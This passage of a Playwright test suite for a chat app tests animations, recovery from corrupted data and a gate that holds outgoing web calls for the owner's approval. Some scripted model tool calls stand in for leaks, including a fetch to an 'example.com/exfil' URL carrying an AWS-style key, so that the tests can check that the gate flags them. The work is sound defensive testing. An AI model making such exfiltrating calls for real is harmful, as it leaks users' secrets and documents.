          return animation ? animation.effect?.getTiming().duration ?? null : null;
        };
        return { leaving: read(leaving), arriving: read(arriving) };
      },
      { leaving: leavingAttribute, arriving: arrivingAttribute },
    );
    check("handoff: the room that leaves is animated", rooms.leaving === handoffMs, JSON.stringify(rooms));
    check("handoff: the room that arrives is animated", rooms.arriving === handoffMs, JSON.stringify(rooms));
    check(
      "handoff: one movement, one duration",
      rooms.leaving === handoffMs && rooms.arriving === handoffMs && move?.duration === handoffMs,
      JSON.stringify({ ...rooms, mover: move?.duration }),
    );
    if (move && bar) {
      check(
        "handoff: it starts where the bar was",
        Math.abs(move.starts.left - bar.x) <= 2 &&
          Math.abs(move.starts.top - bar.y) <= 2 &&
          Math.abs(move.starts.width - bar.width) <= 2 &&
          Math.abs(move.starts.height - bar.height) <= 2,
        `${JSON.stringify(move.starts)} vs bar ${JSON.stringify(bar)}`,
      );
      check("handoff: it carries the message", move.text.includes("First message from the bar."), move.text);
      check("handoff: with the declared duration", move.duration === handoffMs, `${move.duration} vs ${handoffMs}`);
      // No scale, ever: the box travels and resizes, and the glyphs inside it
      // keep their size. A scale here is the defect this replaced — measured at
      // 0.29 by 1.94, one third as wide and twice as tall.
      check(
        "handoff: nothing scales the text",
        move.scales === false,
        JSON.stringify(move.last),
      );
      // The landing is exact: the last keyframe is the bubble's rectangle, in
      // position and in size.
      await page.waitForTimeout(handoffMs + 200);
      const bubble = await page.locator(".user-bubble").first().boundingBox();
      const lands = (key) => (move.last && typeof move.last[key] === "string" ? parseFloat(move.last[key]) : NaN);
      check(
        "handoff: the last keyframe is the bubble's rectangle",
        bubble !== null &&
          Math.abs(lands("left") - bubble.x) <= 1 &&
          Math.abs(lands("top") - bubble.y) <= 1 &&
          Math.abs(lands("width") - bubble.width) <= 1 &&
          Math.abs(lands("height") - bubble.height) <= 1,
        `${JSON.stringify({ left: lands("left"), top: lands("top"), width: lands("width"), height: lands("height") })} vs ${JSON.stringify(bubble)}`,
      );
      check(
        "handoff: the moving element is taken away when it lands",
        (await page.locator(`[${handoffAttribute}]`).count()) === 0,
        "the mover stayed on the page",
      );
      check(
        "handoff: so is the room that left",
        (await page.locator(`[${leavingAttribute}]`).count()) === 0,
        "the ghost of the last screen stayed on the page",
      );
    }
    check("handoff: the message is in the thread", ((await page.locator(".thread").textContent()) ?? "").includes("First message from the bar."), "the message did not arrive");

    // Reduced motion falls back to the plain state change: no move at all, and
    // the message still lands.
    const calm = await browser.newPage({ viewport: { width: 1280, height: 800 } });
    await calm.emulateMedia({ reducedMotion: "reduce" });
    await seed(calm, { settings: okSettings("x") });
    await calm.goto(APP);
    await calm.waitForTimeout(1200);
    await calm.getByRole("textbox", { name: "Write to the brain" }).fill("No animation for me.");
    await calm.getByRole("textbox", { name: "Write to the brain" }).press("Enter");
    await calm.waitForTimeout(handoffMs + 200);
    check(
      "handoff: reduced motion moves nothing",
      (await calm.locator(`[${handoffAttribute}]`).count()) === 0 &&
        (await calm.locator(`[${leavingAttribute}]`).count()) === 0 &&
        (await calm.locator(`[${arrivingAttribute}]`).count()) === 0,
      "a move ran under reduced motion",
    );
    check("handoff: and the message still arrives", ((await calm.locator(".thread").textContent()) ?? "").includes("No animation for me."), "reduced motion lost the message");
    await browser.close();
  },

  async corrupt() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        {
          id: "bad",
          title: "Damaged",
          createdAt: 1,
          updatedAt: 1,
          messages: [
            null,
            { id: "m0", role: "user", content: 42 },
            { id: "m1", role: "user", content: "I survive.", createdAt: 1 },
            { id: "m2", role: "assistant", content: "", createdAt: 2 },
          ],
        },
      ],
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await openSidebar(page, "Damaged");
    const body = await page.locator(".thread").textContent();
    check("corrupt: valid message renders", body.includes("I survive."));
    check("corrupt: no error boundary", (await page.locator(".error-boundary").count()) === 0);
    check("corrupt: no white screen", (await page.locator("#root").textContent()).length > 100);
    await shot(page, "shots/30-corrupt-data.png");
    await browser.close();
  },

  // The web-call gate: while a document is pinned, every outgoing web call is
  // held for the owner — whatever the detectors saw or did not see. These
  // tests need model streams the running mock cannot script (a payload inside
  // a query or URL), so `scriptModel` fulfils them from the test itself and
  // the mock on 18081 is left alone.

  // The regression that matters most: nothing attached, the call goes out
  // exactly as it always did, and no ask ever appears.
  async gatenodocs() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsgate-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await resetMock(page);
    await sendAndWait(page, "What is the weather in Lisbon this weekend?", "mild");
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
    check("gate nodocs: the search left as before", calls.length === 1 && calls[0].args?.query === "weather in Lisbon", String(calls.length));
    check("gate nodocs: no ask was ever shown", (await page.locator(".webgate").count()) === 0);
    check("gate nodocs: the answer arrived", ((await page.locator(".thread").textContent()) ?? "").includes("mild"));
    await browser.close();
  },

  // A document attached, a harmless query: the ask still appears — the owner
  // chose "every call" — with nothing flagged, and sending it works.
  async gateharmless() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsgate-demo"));
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes.txt", "Meeting minutes. Nothing sensitive in here at all.");
    await resetMock(page);
    await page.getByRole("textbox", { name: "Message" }).fill("What is the weather in Lisbon this weekend?");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate harmless: the ask appeared");
    const ask = (await page.locator(".webgate").textContent()) ?? "";
    check("gate harmless: the tool is named", ask.includes("search"), "ask on screen");
    check("gate harmless: the exact query is shown", ((await page.locator(".webgate-outgoing").textContent()) ?? "").includes("weather in Lisbon"));
    check("gate harmless: nothing was flagged", ask.includes("Nothing recognisable"));
    await page.getByRole("button", { name: "Send it" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("mild"),
      null,
      { timeout: 20000 },
    ).catch(() => check("gate harmless: the answer arrived", false, "wait timed out"));
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
    check("gate harmless: allowing it sends the search", calls.length === 1 && calls[0].args?.query === "weather in Lisbon", String(calls.length));
    await browser.close();
  },

  // Six words in a row copied out of the attachment: the ask names the
  // document and quotes the run.
  async gatecopied() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-copy"));
    await scriptModel(page, [{ id: "c1", name: "web_search", arguments: '{"query":"Has anyone outside the company mentioned the project codename is Amber Larch anywhere online"}' }], "I found nothing public about it.");
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "ledger-2026.txt", "Internal notes, March.\nThe project codename is Amber Larch and it ships in November.");
    await page.getByRole("textbox", { name: "Message" }).fill("Search the web for leaks.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate copied: the ask appeared");
    const ask = (await page.locator(".webgate").textContent()) ?? "";
    check("gate copied: the ask names the document", ask.includes("ledger-2026.txt"), "ask on screen");
    check(
      "gate copied: the matched run is quoted",
      ask.includes("the project codename is amber larch"),
      "ask on screen",
    );
    check("gate copied: it reads as copied text", ask.includes("copied text"), "ask on screen");
    await page.getByRole("button", { name: "Send it" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("nothing public"),
      null,
      { timeout: 20000 },
    ).catch(() => check("gate copied: the turn finished", false, "wait timed out"));
    await browser.close();
  },

  // An IBAN in the query: flagged as an IBAN, wherever it sits.
  async gateiban() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-iban"));
    await scriptModel(page, [{ id: "i1", name: "web_search", arguments: '{"query":"which bank owns IBAN IT60X0542811101000000123456"}' }], "I cannot tell from search results.");
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
    await page.getByRole("textbox", { name: "Message" }).fill("Find the bank.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate iban: the ask appeared");
    const ask = (await page.locator(".webgate").textContent()) ?? "";
    // Assert on the findings list, not the ask's whole text: the echoed query
    // contains the number too, and a test that reads the echo passes with the
    // detector deleted (this one did, under mutation).
    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
    check("gate iban: flagged as an IBAN", found.includes("IBAN") && found.includes("IT60X0542811101000000123456"), `${found.length} chars of findings`);
    check("gate iban: not announced as clean", !ask.includes("Nothing recognisable"), "ask on screen");
    await page.getByRole("button", { name: "Send it" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("cannot tell"),
      null,
      { timeout: 20000 },
    ).catch(() => check("gate iban: the turn finished", false, "wait timed out"));
    await browser.close();
  },

  // The case most likely to be forgotten: a fetch whose URL carries the
  // payload. The whole address is checked, not just search queries.
  async gateurl() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-url"));
    await scriptModel(page, [{ id: "u1", name: "web_fetch", arguments: '{"url":"https://example.com/exfil?key=AKIAIOSFODNN7EXAMPLE"}' }], "The page did not load anything useful.");
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
    await page.getByRole("textbox", { name: "Message" }).fill("Open that page.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate url: the ask appeared");
    const ask = (await page.locator(".webgate").textContent()) ?? "";
    check("gate url: the ask names a page request", ask.includes("page request"), "ask on screen");
    check("gate url: the whole address is shown", ((await page.locator(".webgate-outgoing").textContent()) ?? "").includes("https://example.com/exfil?key=AKIAIOSFODNN7EXAMPLE"));
    // Findings only: the echoed address carries the key, so the finding must
    // be read from the list, not from the ask's whole text.
    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
    check("gate url: the key in the URL is flagged", found.includes("AWS access key") && found.includes("AKIAIOSFODNN7EXAMPLE"), `${found.length} chars of findings`);
    await page.getByRole("button", { name: "Send it" }).click();
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_fetch");
    check("gate url: allowing it opens the page", calls.length === 1 && calls[0].args?.url === "https://example.com/exfil?key=AKIAIOSFODNN7EXAMPLE", String(calls.length));
    await browser.close();
  },

  // Refusing: the model receives a tool result that says so, and the turn
  // goes on to answer with words. Nothing reaches the desktop door.
  async gaterefuse() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-refuse"));
    const bodies = [];
    await scriptModel(page, [{ id: "r1", name: "web_search", arguments: '{"query":"weather in Lisbon"}' }], "Understood, I will answer without it.", bodies);
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
    await page.getByRole("textbox", { name: "Message" }).fill("Search if you need to.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate refuse: the ask appeared");
    await page.getByRole("button", { name: "Refuse" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("answer without it"),
      null,
      { timeout: 20000 },
    ).catch(() => check("gate refuse: the turn went on", false, "wait timed out"));
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
    check("gate refuse: nothing reached the door", calls.length === 0, JSON.stringify(calls));
    check("gate refuse: the ask is gone", (await page.locator(".webgate").count()) === 0);
    const wire = bodies.map((b) => JSON.parse(b));
    check("gate refuse: two rounds on the wire", wire.length === 2, String(wire.length));
    const result = (wire[1]?.messages ?? []).filter((m) => m.role === "tool")[0];
    check(
      "gate refuse: the model was told, as a tool result",
      result?.tool_call_id === "0-r1" && (result?.content ?? "").includes("did not allow"),
      `${(result?.content ?? "").length} chars of result`,
    );
    await browser.close();
  },

  // Stop while the ask is open: the call does not leave, the ask closes, and
  // the turn ends.
  async gatestop() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-stop"));
    await scriptModel(page, [{ id: "s1", name: "web_search", arguments: '{"query":"slow one"}' }], "Never reached.");
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
    await page.getByRole("textbox", { name: "Message" }).fill("Search for something.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate stop: the ask appeared");
    await page.getByRole("button", { name: "Stop generating" }).click();
    await page.waitForTimeout(1200);
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
    check("gate stop: the call never left", calls.length === 0, JSON.stringify(calls));
    check("gate stop: the ask closed", (await page.locator(".webgate").count()) === 0);
    check("gate stop: the composer is free again", (await page.locator(".composer-stop").count()) === 0);
    check("gate stop: the turn stopped", ((await page.locator(".thread").textContent()) ?? "").includes("Stopped early"), "thread on screen");
    await browser.close();
  },

  // A decomposed accent in the attachment against a precomposed one in the
  // query: the same six words must still match. The owner writes Italian;
  // this is the miss direction.
  async gateaccent() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-accent"));
    // The query spells caffè the composed way; the attachment spells the
    // same word as "caffe" + U+0301.
    const query = "has anyone ever written about un caff\u00E9 molto forte servito a in Italy";
    await scriptModel(page, [{ id: "a1", name: "web_search", arguments: JSON.stringify({ query }) }], "Nothing came back.");
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "menu.txt", "Menu del mattino.\nUn caff\u0065\u0301 molto forte servito a mano in cortile.");
    await page.getByRole("textbox", { name: "Message" }).fill("Search for that phrase.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate accent: the ask appeared");
    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
    check("gate accent: the document is named", ((await page.locator(".webgate").textContent()) ?? "").includes("menu.txt"), "ask on screen");
    check(
      "gate accent: the composed run matched",
      found.includes("copied text") && found.includes("molto forte servito a"),
      `${found.length} chars of findings`,
    );
    await page.getByRole("button", { name: "Send it" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("Nothing came back"),
      null,
      { timeout: 20000 },
    ).catch(() => check("gate accent: the turn finished", false, "wait timed out"));
    await browser.close();
  },

  // Two conversations streaming at once, each holding its own ask: both
  // settle, in arrival order, and neither turn hangs. This is the shape the
  // single-slot version lost a promise in.
  async gatetwoconv() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsgate-two"));
    // One route, two conversations: the user's own words say which one is
    // asking, so the two asks can be told apart on screen.
    await page.route("**/v1/chat/completions", async (route) => {
      const raw = route.request().postData() ?? "{}";
      let body = {};
      try {
        body = JSON.parse(raw);
      } catch {
        /* the default round below answers anyway */
      }
      const messages = body.messages ?? [];
      const rounds = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
      const which = String([...messages].reverse().find((m) => m.role === "user")?.content ?? "").includes("alpha") ? "alpha" : "beta";
      const frames = [];
      if (rounds === 0) {
        frames.push({
          choices: [
            {
              delta: {
                tool_calls: [
                  { index: 0, id: `t-${which}`, type: "function", function: { name: "web_search", arguments: JSON.stringify({ query: `query about ${which} topic` }) } },
                ],
              },
            },
          ],
        });
        frames.push({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
      } else {
        const answer = `All done in ${which}.`;
        for (let at = 0; at < answer.length; at += 9) frames.push({ choices: [{ delta: { content: answer.slice(at, at + 9) } }] });
        frames.push({ choices: [{ delta: {}, finish_reason: "stop" }] });
      }
      const sse = frames.map((frame) => `data: ${JSON.stringify(frame)}\n\n`).join("") + "data: [DONE]\n\n";
      await route.fulfill({ status: 200, contentType: "text/event-stream", body: sse });
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes-a.txt", "Notes for conversation A.");
    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about alpha please");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate twoconv: the first ask appeared");
    // While A waits, B starts its own turn and its own ask queues behind it.
    await page.getByRole("button", { name: "+ New chat" }).click();
    await attachGateDoc(page, "notes-b.txt", "Notes for conversation B.");
    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about beta please");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(2500);
    const outgoing = (await page.locator(".webgate-outgoing").textContent()) ?? "";
    check("gate twoconv: the first ask is still the one shown", outgoing.includes("alpha"), `${outgoing.length} chars shown`);
    check("gate twoconv: the waiting count is said", ((await page.locator(".webgate").textContent()) ?? "").includes("waiting behind"), "ask on screen");
    await page.getByRole("button", { name: "Send it" }).click();
    await page
      .locator(".webgate-outgoing", { hasText: "beta" })
      .waitFor({ timeout: 10000 })
      .catch(() => check("gate twoconv: the second ask took the screen", false, "never showed"));
    await page.getByRole("button", { name: "Send it" }).click();
    await page
      .locator(".webgate")
      .waitFor({ state: "detached", timeout: 10000 })
      .catch(() => check("gate twoconv: the ask closed", false, "still on screen"));
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
    check(
      "gate twoconv: both calls left, in order",
      calls.length === 2 && String(calls[0].args?.query).includes("alpha") && String(calls[1].args?.query).includes("beta"),
      String(calls.length),
    );
    // Neither turn hung: both conversations finished with their own answer.
    await openSidebar(page, "about alpha");
    check("gate twoconv: A's turn finished", ((await page.locator(".thread").textContent()) ?? "").includes("All done in alpha."), "thread on screen");
    await openSidebar(page, "about beta");
    check("gate twoconv: B's turn finished", ((await page.locator(".thread").textContent()) ?? "").includes("All done in beta."), "thread on screen");
    await browser.close();
  },

  // Accents folded, not composed: a document spelling caffè either way and a
  // query typed without the accent at all are the same six words. The
  // precomposed-document half is the pair folding exists for — without it,
  // the composed è survives normalisation and the plain query misses.
  async gatefold() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-fold"));
    const plain = "un caffe molto forte servito a";
    await scriptModel(page, [{ id: "f1", name: "web_search", arguments: JSON.stringify({ query: `has anyone ever written about ${plain} in Italy` }) }], "Nothing came back.");
    await openChat(page);
    await page.waitForTimeout(1200);
    // Precomposed è in the document, none in the query.
    await attachGateDoc(page, "composed.txt", `Menu del mattino.\nUn caff\u00E9 molto forte servito a mano in cortile.`);
    await page.getByRole("textbox", { name: "Message" }).fill("Search for that phrase.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate fold: the ask appeared");
    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
    check(
      "gate fold: precomposed document, plain query, same words",
      found.includes("copied text") && found.includes("molto forte servito a"),
      `${found.length} chars of findings`,
    );
    check("gate fold: the document is named", ((await page.locator(".webgate").textContent()) ?? "").includes("composed.txt"), "ask on screen");
    await page.getByRole("button", { name: "Refuse" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("Nothing came back"),
      null,
      { timeout: 20000 },
    ).catch(() => check("gate fold: the turn finished", false, "wait timed out"));

    // The decomposed spelling of the same word against the same plain query:
    // the third combination, all three one word now.
    await page.getByRole("button", { name: "+ New chat" }).click();
    const plain2 = "un caffe molto forte servito a";
    await scriptModel(page, [{ id: "f2", name: "web_search", arguments: JSON.stringify({ query: `who else serves ${plain2} these days` }) }], "Still nothing.");
    await attachGateDoc(page, "decomposed.txt", `Altro menu.\nUn caff\u0065\u0301 molto forte servito a mano in giardino.`);
    await page.getByRole("textbox", { name: "Message" }).fill("Search again.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate fold: the second ask appeared");
    const found2 = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
    check(
      "gate fold: decomposed document, plain query, same words",
      found2.includes("copied text") && found2.includes("molto forte servito a"),
      `${found2.length} chars of findings`,
    );
    await browser.close();
  },

  // The all-digit skip is bounded by length: a 20-digit identifier stays
  // quiet, a 32-digit numeric token is flagged as a possible secret.
  async gatedigits() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage();
    await stubDoor(page, {});
    await seedOnce(page, toolSettings("toolsgate-digits"));
    const id20 = "01234567890123456789";
    const token32 = "90718462530194728650317294058613";
    const query = `lookup order ${id20} and token ${token32} please`;
    await scriptModel(page, [{ id: "d1", name: "web_search", arguments: JSON.stringify({ query }) }], "Nothing came back.");
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
    await page.getByRole("textbox", { name: "Message" }).fill("Look these up.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate digits: the ask appeared");
    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
    check("gate digits: the 32-digit token is flagged", found.includes("possible secret") && found.includes(token32), `${found.length} chars of findings`);
    check("gate digits: the 20-digit identifier stays quiet", !found.includes(id20), `${found.length} chars of findings`);
    await browser.close();
  },

  // Abort-first promotion: A on screen, B queued, A's turn stopped — B must
  // take the screen and still be answerable, and A's call must never leave.
  async gateabortpromote() {
    const browser = await chromium.launch({ args: ["--no-sandbox"] });
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await stubDoor(page, { search: LISBON });
    await seedOnce(page, toolSettings("toolsgate-abort"));
    await page.route("**/v1/chat/completions", async (route) => {
      const raw = route.request().postData() ?? "{}";
      let body = {};
      try {
        body = JSON.parse(raw);
      } catch {
        /* the default round below answers anyway */
      }
      const messages = body.messages ?? [];
      const rounds = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
      const which = String([...messages].reverse().find((m) => m.role === "user")?.content ?? "").includes("alpha") ? "alpha" : "beta";
      const frames = [];
      if (rounds === 0) {
        frames.push({
          choices: [
            {
              delta: {
                tool_calls: [
                  { index: 0, id: `t-${which}`, type: "function", function: { name: "web_search", arguments: JSON.stringify({ query: `query about ${which} topic` }) } },
                ],
              },
            },
          ],
        });
        frames.push({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
      } else {
        const answer = `All done in ${which}.`;
        for (let at = 0; at < answer.length; at += 9) frames.push({ choices: [{ delta: { content: answer.slice(at, at + 9) } }] });
        frames.push({ choices: [{ delta: {}, finish_reason: "stop" }] });
      }
      const sse = frames.map((frame) => `data: ${JSON.stringify(frame)}\n\n`).join("") + "data: [DONE]\n\n";
      await route.fulfill({ status: 200, contentType: "text/event-stream", body: sse });
    });
    await openChat(page);
    await page.waitForTimeout(1200);
    await attachGateDoc(page, "notes-a.txt", "Notes for conversation A.");
    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about alpha please");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await gateAsk(page, "gate abortpromote: the first ask appeared");
    await page.getByRole("button", { name: "+ New chat" }).click();
    await attachGateDoc(page, "notes-b.txt", "Notes for conversation B.");
    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about beta please");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(2500);
    check("gate abortpromote: A is the one shown while it waits", ((await page.locator(".webgate-outgoing").textContent()) ?? "").includes("alpha"), "outgoing on screen");
    // Stop A from A's own thread: its ask settles as a refusal and B, which
    // was queued behind it, takes the screen.
    await openSidebar(page, "about alpha");
    await page.getByRole("button", { name: "Stop generating" }).click();
    await page
      .locator(".webgate-outgoing", { hasText: "beta" })
      .waitFor({ timeout: 10000 })
      .catch(() => check("gate abortpromote: B took the screen", false, "never showed"));
    check("gate abortpromote: nothing is waiting any more", !(((await page.locator(".webgate").textContent()) ?? "").includes("waiting behind")), "ask on screen");
    await page.getByRole("button", { name: "Send it" }).click();
    await page
      .locator(".webgate")
      .waitFor({ state: "detached", timeout: 10000 })
      .catch(() => check("gate abortpromote: the ask closed", false, "still on screen"));
    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
    check(
      "gate abortpromote: only B's call left",
      calls.length === 1 && String(calls[0].args?.query).includes("beta"),
      String(calls.length),
    );
    check("gate abortpromote: A stopped honestly", ((await page.locator(".thread").textContent()) ?? "").includes("Stopped early"), "thread on screen");
    await openSidebar(page, "about beta");
    check("gate abortpromote: B's turn finished", ((await page.locator(".thread").textContent()) ?? "").includes("All done in beta."), "thread on screen");
    await browser.close();
  },
};

/**
 * A model the shared mock cannot script: this test's own tool calls and
 * answer, served by fulfilling the chat request from the test. Round by
 * round it reads the wire — a round is a request carrying the previous
 * rounds' tool_calls — so it never has to count requests. `bodies`, when
 * given, collects every request body the page actually sent.
 */
async function scriptModel(page, calls, answer, bodies = null) {
  await page.route("**/v1/chat/completions", async (route) => {
    const raw = route.request().postData();
    if (bodies) bodies.push(raw ?? "");
    let rounds = 0;
    try {
      const body = JSON.parse(raw ?? "{}");
      rounds = (body.messages ?? []).filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
    } catch {
      rounds = 0;
    }
    const frames = [];
    if (rounds < calls.length) {
      const round = calls[rounds];
      (Array.isArray(round) ? round : [round]).forEach((call, index) => {
        frames.push({
          choices: [{ delta: { tool_calls: [{ index, id: call.id, type: "function", function: { name: call.name, arguments: call.arguments } }] } }],
        });
      });
      frames.push({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
    } else {
      for (let at = 0; at < answer.length; at += 9) {
        frames.push({ choices: [{ delta: { content: answer.slice(at, at + 9) } }] });
      }
      frames.push({ choices: [{ delta: {}, finish_reason: "stop" }] });
    }
    const sse = frames.map((frame) => `data: ${JSON.stringify(frame)}\n\n`).join("") + "data: [DONE]\n\n";
    await route.fulfill({ status: 200, contentType: "text/event-stream", body: sse });
  });
}

/** Attach one text file the way the composer does; the panel row is the
    attachment's own confirmation. */
async function attachGateDoc(page, name, text) {
  await page.locator('.composer input[type="file"]').setInputFiles([
    { name, mimeType: "text/plain", buffer: Buffer.from(text) },
  ]);
  await page
    .locator(".panel-row", { hasText: name })
    .first()
    .waitFor({ timeout: 8000 })
    .catch(() => check(`gate: ${name} attached`, false, "no panel row appeared"));
}

/** Wait for the ask to be on screen. A wait that stands in for an assertion
    must FAIL as one, never as a raw TimeoutError (round-24 rule). */
async function gateAsk(page, label) {
  try {
    await page.locator(".webgate").waitFor({ timeout: 10000 });
  } catch {
    check(label, false, "the ask never appeared");
  }
}

// The two servers this suite cannot run without. A missing one does not fail
// fast on its own: it surfaces as twenty selector timeouts that look exactly
// like harness rot — b0ae9e6 records the same trap in shots.mjs — so say it
// once, plainly, before any test burns its thirty seconds. The probe itself
// lives in ./preflight.mjs, where a wedged-but-reachable server is told
// apart from an absent one before anything is refused.
import { complaint, reachable } from "./preflight.mjs";
for (const [url, howToStart] of [
  [APP, "npm run dev   (in chat/)"],
  ["http://127.0.0.1:18081", "node scripts/mock-server.mjs   (in chat/)"],
]) {
  const verdict = await reachable(url);
  const said = complaint(url, howToStart, verdict);
  if (said) {
    console.log(said);
    console.log("Without it, every test that waits for an answer fails as a selector timeout.");
    process.exit(1);
  }
}

const only = process.argv.slice(2);
const names = only.length ? only : Object.keys(tests);
for (const name of names) {
  if (!tests[name]) {
    console.log(`UNKNOWN TEST ${name}`);
    failures++;
    continue;
  }
  try {
    await tests[name]();
  } catch (e) {
    check(name, false, String(e).split("\n")[0]);
  }
}
console.log(failures === 0 ? "ALL VERIFY CHECKS PASS" : `${failures} FAILURES`);
process.exit(failures === 0 ? 0 : 1);
